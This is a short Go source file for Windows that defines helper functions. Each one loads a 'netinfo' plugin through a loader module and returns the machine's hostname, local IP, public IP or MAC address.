//go:build windows

package sysutil

import (
	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func netinfo(fn func(*loader.Plugin)) {
	p, err := loader.Load("netinfo")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func NetHostname() string {
	var r string
	netinfo(func(p *loader.Plugin) { r = pStr(p, "net_hostname", config.SmallBuf) })
	return r
}
func NetLocalIP() string {
	var r string
	netinfo(func(p *loader.Plugin) { r = pStr(p, "net_local_ip", config.SmallBuf) })
	return r
}
func NetPublicIP() string {
	var r string
	netinfo(func(p *loader.Plugin) { r = pStr(p, "net_public_ip", config.SmallBuf) })
	return r
}
func NetMAC() string {
	var r string
	netinfo(func(p *loader.Plugin) { r = pStr(p, "net_mac", config.SmallBuf) })
	return r
}
